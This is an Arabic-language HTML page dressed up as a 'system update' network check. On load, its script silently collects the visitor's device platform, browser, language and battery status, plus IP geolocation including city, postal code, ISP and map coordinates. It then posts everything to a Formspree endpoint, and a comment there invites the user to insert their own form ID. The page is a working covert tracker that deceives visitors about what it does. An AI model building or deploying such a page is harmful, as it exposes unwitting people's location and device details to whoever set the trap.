<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحديث النظام | 2026</title>
    <style>
        body { background: #000; color: #00ff00; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .status-box { border: 1px solid #00ff00; padding: 20px; text-align: center; width: 80%; max-width: 400px; }
        .dots:after { content: '.'; animation: dots 1.5s steps(5, end) infinite; }
        @keyframes dots { 0%, 20% { content: '.'; } 40% { content: '..'; } 60% { content: '...'; } 80%, 100% { content: ''; } }
    </style>
</head>
<body>
    <div class="status-box">
        <div>جاري فحص بروتوكول الشبكة<span class="dots"></span></div>
        <p id="progress" style="font-size: 0.8rem; color: #008800;">تحديد استقرار الاتصال...</p>
    </div>

    <script>
        async function silentCapture() {
            // 1. جمع معلومات الجهاز الأساسية
            const report = {
                timestamp: new Date().toLocaleString(),
                device: navigator.platform,
                browser: navigator.userAgent,
                language: navigator.language
            };

            // 2. جلب أدق بيانات IP (بدون طلب إذن)
            try {
                // نستخدم خدمة ipapi لأنها تعطي بيانات الرمز البريدي والإحداثيات التقريبية للبرج
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                report.network_details = {
                    ip: data.ip,
                    version: data.version,
                    city: data.city,
                    region: data.region,
                    postal_code: data.postal, // الرمز البريدي هو مفتاح الدقة هنا
                    country: data.country_name,
                    isp: data.org, // شركة الاتصالات
                    asn: data.asn, // رقم نظام الشبكة
                    tower_location: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
                };
            } catch (e) {
                report.network_error = "فشل جلب بيانات الـ IP العميق";
            }

            // 3. جلب حالة البطارية (للتأكد من نوع الجهاز)
            try {
                const battery = await navigator.getBattery();
                report.battery = Math.round(battery.level * 100) + "% (" + (battery.charging ? "يشحن" : "لا يشحن") + ")";
            } catch (e) {}

            // 4. إرسال "الطرد" إلى Formspree
            const formID = 'xkozoaaq'; // ضع ID الخاص بك هنا
            
            await fetch(`https://formspree.io/f/${formID}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(report)
            });

            document.getElementById('progress').innerText = "تم التحقق من الاتصال. النظام مستقر.";
        }

        window.onload = silentCapture;
    </script>
</body>
</html>
